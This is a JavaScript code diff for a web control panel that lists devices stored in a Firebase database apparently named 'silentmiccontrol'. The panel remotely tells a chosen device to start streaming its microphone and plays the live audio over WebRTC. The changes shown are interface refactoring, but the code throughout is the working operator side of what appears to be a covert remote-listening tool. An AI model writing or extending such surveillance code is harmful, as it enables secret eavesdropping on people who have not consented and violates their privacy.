@@ -1,12 +1,15 @@
+// Firebase setup
 const firebaseConfig = {
   databaseURL: "https://silentmiccontrol-default-rtdb.firebaseio.com"
 };
-
 firebase.initializeApp(firebaseConfig);
 const db = firebase.database();
 
 const deviceListDiv = document.getElementById("deviceList");
+const audioElement = document.getElementById("remoteAudio");
+const statusDiv = document.getElementById("connectedStatus");
 
+// Load list of devices
 db.ref("devices").once("value").then(snapshot => {
   const devices = snapshot.val();
   deviceListDiv.innerHTML = "";
@@ -17,16 +20,28 @@ db.ref("devices").once("value").then(snapshot => {
   }
 
   Object.keys(devices).forEach(deviceId => {
-    const info = devices[deviceId].info || {};
-    const btn = document.createElement("button");
-    btn.textContent = `▶️ Listen to ${deviceId}`;
-    btn.onclick = () => listenToDevice(deviceId);
-    deviceListDiv.appendChild(btn);
+    const deviceInfo = devices[deviceId].info || {};
+
+    const deviceCard = document.createElement("div");
+    deviceCard.className = "device";
+
+    const label = document.createElement("span");
+    label.textContent = `Device: ${deviceId}`;
+
+    const button = document.createElement("button");
+    button.textContent = "▶️ Listen";
+    button.onclick = () => listenToDevice(deviceId);
+
+    deviceCard.appendChild(label);
+    deviceCard.appendChild(button);
+    deviceListDiv.appendChild(deviceCard);
   });
 });
 
+// Handle listening
 function listenToDevice(deviceId) {
-  deviceListDiv.innerHTML = `Connecting to <b>${deviceId}</b>...`;
+  deviceListDiv.innerHTML = `<b>Connecting to ${deviceId}...</b>`;
+  statusDiv.textContent = "";
 
   const liveRef = db.ref(`live_audio/${deviceId}`);
   liveRef.child("command").set("start");
@@ -59,14 +74,14 @@ function listenToDevice(deviceId) {
   });
 
   peer.on("stream", stream => {
-    const audio = new Audio();
-    audio.srcObject = stream;
-    audio.play();
-    deviceListDiv.innerHTML = `<b>✅ Now listening to ${deviceId}</b>`;
+    audioElement.srcObject = stream;
+    audioElement.style.display = "block";
+    audioElement.play();
+    statusDiv.innerHTML = `✅ Now listening to <b>${deviceId}</b>`;
   });
 
   peer.on("error", err => {
     console.error("Peer error", err);
-    deviceListDiv.innerHTML = `<b>❌ Error connecting to ${deviceId}</b>`;
+    statusDiv.innerHTML = `❌ Error connecting to <b>${deviceId}</b>`;
   });
 }
